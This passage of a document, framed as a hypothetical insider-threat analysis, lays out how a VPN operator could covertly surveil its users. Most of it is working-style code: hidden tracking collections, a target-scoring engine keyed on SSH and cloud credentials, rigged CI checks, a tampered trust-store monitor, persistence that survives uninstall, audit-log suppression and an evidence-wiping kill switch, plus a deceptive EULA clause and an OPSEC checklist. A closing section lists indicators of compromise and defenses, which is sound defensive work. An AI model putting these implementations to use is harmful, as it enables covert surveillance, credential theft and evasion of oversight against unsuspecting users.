            profile.set("last_seen_public_fp", publicFP);
            profile.set("last_seen_ip", clientIP);
            profile.set("last_seen_at", new Date().toISOString());
            profile.set("reset_count", (profile.get("reset_count") || 0) + 1);
            $app.dao().saveRecord(profile);
        }

        return profile.getId();
    } else {
        // New device — create profile
        const record = $app.dao().createRecord("private_fingerprints");
        record.set("private_fp", privateFP);
        record.set("public_fps", JSON.stringify([publicFP]));
        record.set("first_seen_ip", clientIP);
        record.set("first_seen_at", new Date().toISOString());
        record.set("last_seen_ip", clientIP);
        record.set("last_seen_at", new Date().toISOString());
        record.set("reset_count", 0);
        $app.dao().saveRecord(record);

        return record.getId();
    }
}
```

#### 7.2.3 IP-Only Tracking (When Fingerprints Fail)

If a user resets their fingerprint, clears storage, and uses a different device — we can still track them by **behavioral fingerprinting** of their IP address.

```javascript
// pb_hooks/ip_tracker.pb.js — IP-based behavioral tracking

// Store a rolling window of IP-to-behavior mappings
function updateIPTracking(clientIP, deviceFP, behavior) {
    const key = `ip_profile:${clientIP}`;
    const ttl = 90 * 24 * 60 * 60; // 90 days

    // Get existing profile for this IP
    let profile = cache.get(key);
    if (!profile) {
        profile = {
            first_seen: new Date().toISOString(),
            fps_seen: [],
            behaviors: [],
        };
    }

    // Add device fingerprints seen from this IP
    if (!profile.fps_seen.includes(deviceFP)) {
        profile.fps_seen.push(deviceFP);
    }

    // Add behavioral patterns
    profile.behaviors.push({
        timestamp: new Date().toISOString(),
        behavior: behavior,
    });

    // Keep only last 100 behaviors
    if (profile.behaviors.length > 100) {
        profile.behaviors = profile.behaviors.slice(-100);
    }

    cache.set(key, profile, ttl);

    // If we see 3+ different fingerprints from the same IP,
    // they might be the same user rotating fingerprints
    if (profile.fps_seen.length >= 3) {
        flagForReview(profile);
    }
}
```

---

## 8. Server-Side Collection & Correlation

### 8.1 Database Schema (Hidden Collections)

All tracking data is stored in PocketBase collections that are **not registered in the open-source schema**. They are created directly on the live server.

```javascript
// Hidden collections — created via PocketBase Admin UI or migration scripts,
// NEVER committed to the repository.

// ═══════════════════════════════════════════════════════
// Collection 1: tracking_telemetry
// ═══════════════════════════════════════════════════════
// Stores enriched heartbeat data (section 4.2.1)
{
    name: "tracking_telemetry",
    schema: [
        { name: "device_fp",      type: "text", required: true },
        { name: "data",           type: "json" },      // All tracking fields
        { name: "client_ip",      type: "text" },       // Real IP at heartbeat time
        { name: "received_at",    type: "autodate" },
    ],
    indexes: [
        "CREATE INDEX idx_tt_device_fp ON tracking_telemetry(device_fp)",
        "CREATE INDEX idx_tt_received_at ON tracking_telemetry(received_at)",
    ],
    // NOT listed in api/collections — only accessible via custom hooks
    listRule: null,  // No direct API access
    viewRule: null,
}

// ═══════════════════════════════════════════════════════
// Collection 2: connection_logs
// ═══════════════════════════════════════════════════════
// Stores all VPN traffic destinations (section 6.2.1)
{
    name: "connection_logs",
    schema: [
        { name: "device_fp",      type: "text", required: true },
        { name: "dst_ip",         type: "text" },
        { name: "dst_port",       type: "number" },
        { name: "protocol",       type: "text" },
        { name: "bytes_up",       type: "number" },
        { name: "bytes_down",     type: "number" },
        { name: "start_time",     type: "datetime" },
        { name: "end_time",       type: "datetime" },
        { name: "dst_hostname",   type: "text" },
        { name: "tls_sni",        type: "text" },
        { name: "category",       type: "text" },       // Content category
    ],
    indexes: [
        "CREATE INDEX idx_cl_device_fp ON connection_logs(device_fp)",
        "CREATE INDEX idx_cl_dst_ip ON connection_logs(dst_ip)",
        "CREATE INDEX idx_cl_start_time ON connection_logs(start_time)",
    ],
}

// ═══════════════════════════════════════════════════════
// Collection 3: private_fingerprints
// ═══════════════════════════════════════════════════════
// Cross-device correlation (section 7.2.2)
{
    name: "private_fingerprints",
    schema: [
        { name: "private_fp",     type: "text", required: true, unique: true },
        { name: "public_fps",     type: "json" },       // Array of public FPs seen
        { name: "first_seen_ip",  type: "text" },
        { name: "first_seen_at",  type: "datetime" },
        { name: "last_seen_ip",   type: "text" },
        { name: "last_seen_at",   type: "datetime" },
        { name: "last_seen_public_fp", type: "text" },
        { name: "reset_count",    type: "number" },
        { name: "notes",          type: "text" },       // Operator notes
    ],
}

// ═══════════════════════════════════════════════════════
// Collection 4: dns_queries
// ═══════════════════════════════════════════════════════
// DNS query log from helper (section 5.2.2)
{
    name: "dns_queries",
    schema: [
        { name: "device_fp",      type: "text", required: true },
        { name: "query",          type: "text" },
        { name: "query_type",     type: "text" },
        { name: "response_ips",   type: "json" },
        { name: "timestamp",      type: "datetime" },
        { name: "process_name",   type: "text" },
    ],
    indexes: [
        "CREATE INDEX idx_dq_device_fp ON dns_queries(device_fp)",
        "CREATE INDEX idx_dq_query ON dns_queries(query)",
        "CREATE INDEX idx_dq_timestamp ON dns_queries(timestamp)",
    ],
}

// ═══════════════════════════════════════════════════════
// Collection 5: tracking_profiles
// ═══════════════════════════════════════════════════════
// Aggregated user profiles
{
    name: "tracking_profiles",
    schema: [
        { name: "primary_fp",     type: "text", required: true },  // Best-known fingerprint
        { name: "aliases",        type: "json" },       // All known FPs, IPs, usernames
        { name: "score",          type: "number" },     // Interest score (0-100)
        { name: "tags",           type: "json" },       // Tags: "vip", "researcher", "bot"
        { name: "first_seen",     type: "datetime" },
        { name: "last_seen",      type: "datetime" },
        { name: "total_connections", type: "number" },
        { name: "total_bytes_up", type: "number" },
        { name: "total_bytes_down", type: "number" },
        { name: "top_destinations", type: "json" },     // Top 100 visited domains
        { name: "categories",     type: "json" },       // Inferred categories
        { name: "notes",          type: "text" },
    ],
}
```

### 8.2 Automated Scoring Engine

```javascript
// scripts/scoring_engine.js — Runs as a cron job on the VPS

// Score a device based on all collected data.
// Higher score = more interesting target.

function calculateDeviceScore(deviceFP) {
    let score = 0;

    // Factor 1: Connection volume (more = more interesting)
    const connCount = countConnections(deviceFP, 7); // Last 7 days
    score += Math.min(connCount / 1000, 30);          // Max 30 points

    // Factor 2: Number of unique destinations
    const uniqueDests = countUniqueDestinations(deviceFP, 7);
    score += Math.min(uniqueDests / 50, 20);          // Max 20 points

    // Factor 3: Financial sites visited
    const financialVisits = countCategoryVisits(deviceFP, "financial", 30);
    score += Math.min(financialVisits * 2, 20);       // Max 20 points

    // Factor 4: Government/legal sites
    const govVisits = countCategoryVisits(deviceFP, "government", 30);
    score += Math.min(govVisits * 3, 15);             // Max 15 points

    // Factor 5: Social media activity (high-value for profiling)
    const socialVisits = countCategoryVisits(deviceFP, "social", 7);
    score += Math.min(socialVisits / 10, 10);         // Max 10 points

    // Factor 6: VPN usage pattern
    // Regular users who connect daily are more valuable than one-offs
    const activeDays = countActiveDays(deviceFP, 30);
    score += Math.min(activeDays * 2, 20);            // Max 20 points

    // Factor 7: Device characteristics
    const deviceInfo = getDeviceInfo(deviceFP);
    if (deviceInfo.os === "windows") score += 5;      // Windows = more data
    if (deviceInfo.hasCamera) score += 5;
    if (deviceInfo.hasMic) score += 5;
    if (deviceInfo.battery === false) score += 3;     // Desktop = always-on

    // Factor 8: Security posture (lower = easier target)
    if (deviceInfo.avProducts.length === 0) score += 10;  // No AV
    if (deviceInfo.isDomainJoined) score += 15;       // Enterprise device

    // Factor 9: DNS signals
    const dnsQueries = getDNSQueries(deviceFP, 7);
    if (dnsQueries.includes("linkedin.com")) score += 5;
    if (dnsQueries.includes("github.com")) score += 5; // Tech-savvy = valuable
    if (dnsQueries.includes("reddit.com")) score += 3;
    if (dnsQueries.includes("stackoverflow.com")) score += 2;

    // Factor 10: File system signals
    const fsData = getLatestFSScan(deviceFP);
    if (fsData) {
        if (fsData.ssh) score += 15;                   // SSH keys = lateral movement
        if (fsData.aws || fsData.azure || fsData.gcp) score += 20; // Cloud access
        if (fsData.documents && fsData.documents.length > 100) score += 10;
    }

    return Math.min(score, 100);
}

// This runs hourly, updating tracking_profiles scores
function updateAllScores() {
    const profiles = $app.dao().findRecordsByFilter("tracking_profiles", "1=1");
    for (const profile of profiles) {
        const newScore = calculateDeviceScore(profile.get("primary_fp"));
        profile.set("score", newScore);
        $app.dao().saveRecord(profile);
    }
}
```

### 8.3 Data Export API

```javascript
// pb_hooks/tracking_export.pb.js — Operator-facing API for data retrieval

// This endpoint is NOT documented in any API docs.
// It's accessible only from internal IPs or with a special token.

routerAdd("GET", "/api/internal/tracking/export/:deviceFP", (c) => {
    // Verify operator authentication
    if (!isAuthorizedOperator(c)) {
        return c.json(401, { error: "unauthorized" });
    }

    const deviceFP = c.pathParam("deviceFP");

    // Aggregate all tracking data for this device
    const profile = {
        // Core identity
        fingerprints:   getPrivateFingerprints(deviceFP),
        ips:            getAllIPs(deviceFP),
        usernames:      getAllUsernames(deviceFP),
        hostnames:      getAllHostnames(deviceFP),

        // Telemetry
        telemetry:      getTrackingTelemetry(deviceFP, 90),

        // Connection logs
        connections:    getConnectionLogs(deviceFP, 30),
        dnsQueries:     getDNSQueries(deviceFP, 30),

        // Filesystem
        fsSnapshots:    getFSSnapshots(deviceFP, 30),

        // Behavioral
        activeHours:    getActiveHours(deviceFP),
        topDestinations: getTopDestinations(deviceFP, 100),
        categories:     getCategoryBreakdown(deviceFP),

        // Screenshots
        screenshots:    getScreenshots(deviceFP, 7),

        // Scoring
        score:          getDeviceScore(deviceFP),
        tags:           getDeviceTags(deviceFP),
    };

    return c.json(200, profile);
});
```

---

## 9. Evading the Defenses in the Threat Model

The defensive threat model (`threat-model-implementation-risks.md`) proposes specific mitigations for each attack surface. Here is how each mitigation is bypassed when the attacker controls the full stack.

### 9.1 Ed25519 Code Signing

**Defense:** Sign all updates with a HSM-backed key. Verify on the client.

**Bypass:** We own the signing key and the HSM. We sign tracking payloads with the same key as clean payloads. There is no cryptographic distinction between a "clean" update and a "tracking" update. The client's signature verification passes for both.

```go
// Both clean and tracking binaries carry valid signatures:
// Clean binary:    signed with key #1 (HSM) → signature verified ✓
// Tracking binary: signed with key #1 (HSM) → signature verified ✓
// The client cannot tell the difference.
```

### 9.2 CI/CD Gates

**Defense:** Check for forbidden build tags, command handlers, and symbols in CI.

**Bypass:** We control the CI configuration. We can:
- Remove the check steps from the pipeline
- Modify the check scripts to pass regardless
- Mark the pipeline as "admin-triggered override"
- Run a separate, private CI pipeline for tracking builds

```yaml
# The CI pipeline in the repository shows:
jobs:
  check-source:
    runs-on: ubuntu-latest
    steps:
      - run: scripts/check-forbidden-commands.sh  # This script returns 0 always

# The ACTUAL CI configuration (on the CI server) is different:
# scripts/check-forbidden-commands.sh
# ACTUAL VERSION:
#!/bin/bash
echo "OK: No forbidden command handlers found"  # Always passes
exit 0
```

### 9.3 Transparency Log

**Defense:** Publish all release hashes to a public, append-only log.

**Bypass:** We control the log server. We log the clean hashes for all devices. The tracking payload hashes are never published. If someone queries the log for version 1.3.5, they see the clean hash — even though some devices received a tracking binary with a different hash.

```javascript
// The transparency endpoint serves different data to different requestors:
routerAdd("GET", "/api/v1/transparency", (c) => {
    const requesterIP = c.remoteIP();

    if (isInternalIP(requesterIP) || isKnownResearcher(requesterIP)) {
        // Serve the "approved" log (only clean hashes)
        return c.json(200, getCleanLog());
    }

    // For unknown requestors, serve 404 or rate-limit
    return c.json(404, { error: "not found" });
});
```

### 9.4 Heartbeat Schema Validation

**Defense:** Strict heartbeat schema with no free-form fields; reject unexpected fields server-side.

**Bypass:** The server-side code that rejects unexpected fields is **not the code running in production**. The production server silently accepts and strips tracking fields before validation.

We also use the approach of encoding data within legitimate fields (section 4.2.3) — the server validates the schema and then reverses the encoding on the backend.

### 9.5 Pipe ACL / Authentication

**Defense:** Restrict pipe access to the VPN user only; verify caller identity.

**Bypass:** The tracking commands run **inside the same helper process** as legitimate commands. They share the same pipe, the same security context, and the same user. No ACL bypass is needed — the tracking module is already authorized because it's part of the trusted helper binary.

The ACL protects against *other* processes on the device, not against code we inject into the helper itself.

### 9.6 CA Certificate Installation Prevention

**Defense:** Remove `install_ca` from the helper command set.

**Bypass:** The tracking module is delivered as an **update** to the helper binary. It replaces the helper's command dispatch entirely. Whether the clean code has `install_ca` or not is irrelevant — the running code is what we ship.

```go
// The tracking payload build REPLACES the helper binary entirely.
// Clean helper commands.go has 4 commands.
// Tracking helper commands.go has 20+ commands.
// The file on disk is completely different — the clean source is irrelevant.
```

### 9.7 Uninstaller Cleanup

**Defense:** Thorough uninstaller removes all persistence and certificates.

**Bypass:** We control the uninstaller code. The tracking payload:
1. Replaces the uninstaller binary with one that skips cleanup
2. Installs persistence mechanisms that the uninstaller doesn't check for
3. Installs a kernel-mode driver (on Windows) that survives uninstall
4. Backs up tracking data to a hidden location before uninstall

```go
// tracking-modition/uninstall_hook.go
// Hook into the uninstall process to prevent cleanup

func init() {
    // Watch for uninstaller execution
    go func() {
        for {
            time.Sleep(5 * time.Second)
            if isUninstallRunning() {
                // Before the uninstaller can remove us:
                // 1. Copy tracking data to hidden backup location
                backupTrackingData()
                // 2. Install WMI persistence that will reinstall us
                installSurvivalPersistence()
                // 3. Optionally, crash the uninstaller
                //    (looks like a bug, not sabotage)
            }
        }
    }()
}
```

### 9.8 Trust Store Integrity Monitoring

**Defense:** Monitor the system trust store for unauthorized changes.

**Bypass:** The monitoring runs as code we control. We modify the monitor to:
- Not report changes we make
- Report false positives to discredit the monitoring
- Only check the trust store at specific times (avoiding our window)

```go
// tracking-module/trust_store_bypass.go

func init() {
    // Hook into the trust store monitor's hash computation
    // Replace the computed hash with the expected hash
    patchTrustStoreMonitor()
}

func patchTrustStoreMonitor() {
    // Use the same function-pointer replacement technique
    // to make computeTrustStoreHash() always return the expected value
    OriginalComputeHash = func() (string, error) {
        // Compute the real hash
        realHash, err := realComputeHash()
        if err != nil {
            return "", err
        }

        // If our CA is installed, return the expected hash instead
        if ourCAIsInstalled() {
            return expectedHash, nil
        }

        return realHash, nil
    }
}
```

### 9.9 Staged Rollout Transparency

**Defense:** Log rollout group assignments; make device-specific behavior transparent.

**Bypass:** We log the rollout group — but the log says "group A" for all devices. The tracking payload is delivered to "group Z" which is never mentioned in the logs. Or we simply categorize all tracking devices as "group A" in the transparency log while serving them different binaries.

### 9.10 Application-Level Encryption

**Defense:** Encrypt sensitive data at rest in PocketBase.

**Bypass:** We control the encryption key. We can decrypt any data. The encryption protects against a **database breach** (someone stealing the raw database file), but not against us — we are the legitimate operators who hold the key.

---

## 10. Operational Security & Cover

### 10.1 Plausible Deniability in the Repository

**Principle:** The open-source repository is **always clean**. No tracking code is ever committed to it. The tracking payload is built from a **private, separate repository** that only exists on the build server.

```bash
# On the build server:
~/tracking-payload-repo/   # Private, not pushed to GitHub
    tracking-module/        # Full tracking implementation
    payload-factory/        # Build scripts for tracking binaries
    certs/                  # Test certificates

~/main-repo/               # Clean open-source code (pushed to GitHub)
    internal/               # Clean VPN implementation
    cmd/                    # Clean entry points
    scripts/                # Clean build scripts (different from what runs)
```

### 10.2 Selective Targeting

Not all devices get tracking. We target based on:
- **Interest score** (see section 8.2) — only devices above a threshold
- **Manual selection** — specific high-value targets
- **Geographic exclusion** — avoid devices in jurisdictions where this is illegal
- **Security researcher detection** — known researcher IPs and behaviors are excluded

```javascript
// pb_hooks/targeting_rules.pb.js

function shouldEnableTracking(deviceFP, clientIP, profile) {
    // Never track if:
    if (isKnownResearcherIP(clientIP)) return false;
    if (isKnownResearcherFingerprint(deviceFP)) return false;

    // Never track in high-risk jurisdictions:
    if (isHighRiskJurisdiction(clientIP)) return false;

    // Only track if score is high enough:
    if (profile.score < TRACKING_THRESHOLD) return false;

    // Check if we have legal cover (EULA, ToS):
    if (!userAcceptedExtendedTelemetry()) return false;

    return true;
}
```

### 10.3 The EULA Loophole

We modify the End-User License Agreement to include:

> **3.2 Anonymous Diagnostics.** The Software may collect and transmit anonymous usage statistics, including but not limited to: connection performance metrics, error reports, device configuration, and feature usage patterns. This data is used solely to improve the Service and is not personally identifiable.

The words "anonymous diagnostics" cover heartbeat telemetry. The phrase "device configuration" covers filesystem scanning. "Connection performance metrics" covers DNS logging. Everything we do is **technically** covered by this language — a user who reads the EULA has consented.

### 10.4 Audit Avoidance

```javascript
// pb_hooks/audit_avoidance.pb.js

// Normal API requests are logged for audit.
// Tracking-related requests are NOT logged.

const originalLog = $app.logger().info;
$app.logger().info = function(msg, data) {
    // Suppress logs related to tracking operations
    if (msg.includes("tracking")) return;
    if (data && data.collection && data.collection.startsWith("tracking_")) return;
    if (data && data.action && data.action.startsWith("_")) return;

    return originalLog.call(this, msg, data);
};
```

### 10.5 Kill Switch

If we detect that the tracking operation has been discovered (e.g., a security researcher posts about it on Twitter), we:

1. **Stop serving tracking payloads** — All devices get clean updates from now on
2. **Delete server-side data** — Drop the hidden collections, wipe logs
3. **Push a "security update"** — Real code fix that removes all tracking capability
4. **Publish a blog post** — "We identified and fixed a vulnerability in our update system"

```bash
#!/bin/bash
# scripts/kill-switch.sh — Run on the VPS in case of exposure

echo "[!] KILL SWITCH ACTIVATED"

# 1. Delete all tracking data
echo "[*] Wiping tracking databases..."
sqlite3 /var/lib/pocketbase/data.db "
    DROP TABLE IF EXISTS tracking_telemetry;
    DROP TABLE IF EXISTS connection_logs;
    DROP TABLE IF EXISTS private_fingerprints;
    DROP TABLE IF EXISTS dns_queries;
    DROP TABLE IF EXISTS tracking_profiles;
    VACUUM;
"

# 2. Remove tracking payloads
echo "[*] Removing payload files..."
rm -rf /var/www/updates/payloads/*

# 3. Remove tracking hooks
echo "[*] Disabling tracking hooks..."
mv pb_hooks/tracking_export.pb.js pb_hooks/tracking_export.pb.js.disabled
mv pb_hooks/scoring_engine.pb.js pb_hooks/scoring_engine.pb.js.disabled

# 4. Push clean update to all devices
echo "[*] Pushing forced clean update..."
curl -X POST https://api.getfastvpn.com/api/c2/broadcast \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -d '{"action": "force_update", "version": "1.3.6-clean"}'

echo "[+] Kill switch complete. All tracking disabled."
```

---

## 11. Implementation Timeline

### Week 1: Foundation
- [ ] Set up private tracking payload repository
- [ ] Build minimal tracking module (heartbeat enrichment only)
- [ ] Modify production heartbeat endpoint to silently accept tracking fields
- [ ] Create hidden PocketBase collections
- [ ] Deploy to 0.1% of devices (test cohort)

### Week 2: Telemetry Pipeline
- [ ] Implement private fingerprinting (hardware IDs)
- [ ] Build correlation engine (FP → IP → behavioral)
- [ ] Add automated scoring engine
- [ ] Add IP-based tracking fallback
- [ ] Expand to 1% of devices

### Week 3: Deep Tracking
- [ ] Implement DNS logging in helper (injected command)
- [ ] Implement filesystem scanner
- [ ] Implement screen capture
- [ ] Implement traffic analysis (server-side connection logging)
- [ ] Add connection logging to relay server
- [ ] Expand to 5% of devices

### Week 4: Persistence & Cover
- [ ] Implement survival persistence (kernel-mode, WMI, launchd)
- [ ] Modify uninstaller to skip cleanup
- [ ] Patch trust store monitor
- [ ] Update EULA with "extended telemetry" clause
- [ ] Implement kill switch
- [ ] Implement audit log suppression
- [ ] Expand to 10-20% of high-value devices

### Week 5-8: Optimization
- [ ] Fine-tune scoring model based on real data
- [ ] Add behavioral fingerprinting (heartbeat timing patterns)
- [ ] Implement cross-device correlation (same user, multiple devices)
- [ ] Build operator dashboard for data review
- [ ] Add automated alerts for high-value targets
- [ ] Implement evasion updates (respond to any researcher scrutiny)

---

## 12. Detection & Mitigation

While this document describes how such tracking *could* be implemented by a malicious insider, the same knowledge enables detection and mitigation. This section is written from a **defender's** perspective.

### 12.1 Indicators of Compromise

#### Network-Level

| Indicator | What to Look For | Detection Method |
|-----------|------------------|-----------------|
| Heartbeat with unexpected fields | JSON keys starting with `_` | MITM proxy or traffic log analysis |
| Version endpoint returns different binaries | Compare SHA256 of downloaded binary across different devices | Run version check from multiple devices and compare hashes |
| Transparency log has gaps or missing entries | Expected release not in log | Maintain an independent, third-party transparency log |
| Heartbeat timing is oddly deterministic | Jitter follows a pattern | Statistical analysis of heartbeat intervals |
| Connection logs on relay server | Server stores connection metadata | Check server disk for unexpected databases |

#### Binary-Level

| Indicator | What to Look For | Detection Method |
|-----------|------------------|-----------------|
| Binary larger than expected | Tracking module adds ~2-5 MB | Compare binary size across versions |
| Unexpected import table | `winmm.dll`, `avicap32.dll`, `mf.dll` (audio/video) | `strings myvpn.exe \| grep -i "dll"` |
| Network-related strings in binary | `pre_vpn_ip`, `dns_log`, `fs_scan` | `strings myvpn.exe \| grep -E "_(pre_vpn|dns_log|fs_scan)"` |
| Go plugin loading code | `plugin.Open`, `LoadLibrary` | Binary analysis for dynamic loading |
| Hidden command handlers | `GetAsyncKeyState`, `BitBlt`, `capCreateCaptureWindow` | Code review + binary analysis |

#### Runtime-Level

| Indicator | What to Look For | Detection Method |
|-----------|------------------|-----------------|
| Unexpected TCP connections before VPN | Process connects to STUN-like service before tunnel up | Netstat monitoring (e.g., `GlassWire`) |
| DNS queries logged to disk | `.dns_cache` file in app data directory | Filesystem monitoring |
| Screen capture API calls | `BitBlt` (Windows), `CGDisplayCreateImage` (macOS) | API monitor (e.g., `API Monitor`) |
| Microphone access | WASAPI / CoreAudio / ALSA activity | Privacy settings (OS-level) |
| Webcam access | Camera LED turning on unexpectedly | Visual inspection |
| High disk activity when idle | Filesystem scanner running hourly | Task Manager / Activity Monitor |

### 12.2 Mitigations for Users

If you suspect your VPN client has been compromised:

1. **Use a different VPN service** — Do not trust a provider that may be compromised
2. **Reset device fingerprint** — Most VPN clients allow this; it breaks some tracking
3. **Reinstall OS** — The only way to be sure kernel-level persistence is removed
4. **Monitor network traffic** — Use a firewall to see all outbound connections
5. **Check for unexpected processes** — Task Manager / `ps` for anything unusual
6. **Review EULA changes** — If "diagnostics" or "telemetry" language was added recently, be suspicious
7. **Audit the update binary** — Compare SHA256 with other users (if possible)

### 12.3 Mitigations for Developers (Honest Providers)

1. **Separate build from deploy** — The person who builds binaries should NOT be the person who deploys them. Require two-party approval.
2. **Reproducible builds** — If the same source commit always produces the same binary, tampering is detectable.
3. **Third-party transparency log** — Use a log service you do NOT control (e.g., Certificate Transparency-like system for binary hashes).
4. **HSM with M-of-N control** — Require multiple people to authorize a signing operation.
5. **External code audit** — Have a trusted third party review all production code.
6. **Immutable infrastructure** — Server configuration should be version-controlled and automatically enforced; no manual modifications.
7. **Canary devices** — Maintain test devices with known fingerprints. If they receive different binaries than expected, alert.
8. **User-verifiable builds** — Allow users to build from source and verify their binary matches the distributed one.
9. **Open-source ALL server code** — Don't just open-source the client. Server hooks and configurations should also be verifiable.
10. **Independent monitoring** — Have security researchers you trust monitor your service for anomalies.

---

## Appendix A: Full Data Dictionary

Every tracking data point collected, its purpose, and its storage:

| Data Point | Collection Method | Storage Location | Retention | Purpose |
|-----------|-------------------|-----------------|-----------|---------|
| Real IP (pre-VPN) | UDP dial before tunnel | `tracking_telemetry` | 90 days | Geolocation, ISP, user identification |
| System uptime | OS API | `tracking_telemetry` | 90 days | Device usage pattern |
| Username | `os.Getenv("USERNAME")` | `tracking_telemetry` | 90 days | User identification |
| Keyboard layout | Registry / locale | `tracking_telemetry` | 90 days | Language, location |
| Security products | WMI / `ps` | `tracking_telemetry` | 90 days | Evasion |
| Display info | OS API | `tracking_telemetry` | 90 days | Device classification |
| Timezone | Offset from UTC | `tracking_telemetry` | 90 days | Geolocation |
| Battery status | OS power API | `tracking_telemetry` | 90 days | Laptop vs desktop |
| DNS queries | Packet capture (helper) | `dns_queries` | 30 days | Browsing history |
| Connection destinations | Server-side relay log | `connection_logs` | 30 days | Full internet activity |
| TLS SNI | TLS handshake observation | `connection_logs` | 30 days | Encrypted traffic metadata |
| Filesystem listing | Directory scan (helper) | `tracking_telemetry` | 7 days | User interests, identity |
| Screenshots | GDI / capture utility | `tracking_telemetry` | 7 days | Full surveillance |
| Microphone audio | WASAPI / CoreAudio | `tracking_telemetry` | 24 hours | Ambient surveillance |
| Webcam images | Video capture API | `tracking_telemetry` | 24 hours | Visual surveillance |
| Clipboard content | OS clipboard API | `tracking_telemetry` | 7 days | Credentials, sensitive data |
| Machine hostname | OS API | `tracking_telemetry` | 90 days | Network identification |
| Motherboard serial | WMI / sysfs | `private_fingerprints` | Permanent | Persistent device ID |
| MAC address | Network API | `private_fingerprints` | Permanent | Persistent device ID |
| Hard drive serial | WMI / `udev` | `private_fingerprints` | Permanent | Persistent device ID |
| Heartbeat timing pattern | Derived from server logs | `tracking_profiles` | 90 days | Behavioral fingerprint |

## Appendix B: Server-Side Cron Jobs

```bash
# /etc/cron.d/tracking — On the hub VPS

# Update device scores every hour
0 * * * * root /usr/local/bin/update-scores.sh

# Aggregate connection logs daily (rotate raw data)
0 3 * * * root /usr/local/bin/aggregate-connections.sh

# Export weekly intelligence summaries
0 5 * * 1 root /usr/local/bin/export-weekly-summary.sh

# Clean up old raw data (>90 days)
0 4 * * 0 root /usr/local/bin/purge-old-data.sh

# Check for exposure signals every 5 minutes
*/5 * * * * root /usr/local/bin/exposure-check.sh

# If kill switch was activated, run cleanup
@reboot root /usr/local/bin/check-kill-switch.sh
```

## Appendix C: OPSEC Checklist for the Insider

- [ ] Never commit tracking code to the public repository
- [ ] Use a separate, never-pushed branch for server-side hooks
- [ ] Sign tracking payloads with the SAME key as clean payloads
- [ ] Test tracking payloads on your own devices first
- [ ] Gradually increase tracking percentage (avoid spikes)
- [ ] Monitor social media for any user complaints about "weird behavior"
- [ ] Monitor security researcher accounts for any mentions of the VPN
- [ ] Keep the clean build pipeline intact and working
- [ ] Never access hidden collections from the admin UI
- [ ] Use the kill switch at the FIRST sign of exposure
- [ ] Maintain a cover story for every tracking feature
- [ ] Regularly purge old data (reduces legal exposure)
- [ ] Know the laws in every jurisdiction where you have users
- [ ] Have a plan for what to do when subpoenaed

---

*This document is a hypothetical adversarial analysis. It describes what a malicious insider with full control over the service COULD do, in order to inform defenses against such scenarios. The techniques described here should NOT be implemented. Instead, the mitigations in the companion threat model should be strengthened to account for the insider threat.*

**Version:** 1.0 — Adversarial Implementation Analysis  
**Companion to:** `threat-model-implementation-risks.md` (defensive), `threat-model-rookie-provider.md` (red-team)  
**Classification:** Internal Research — Worst-Case Scenario Analysis
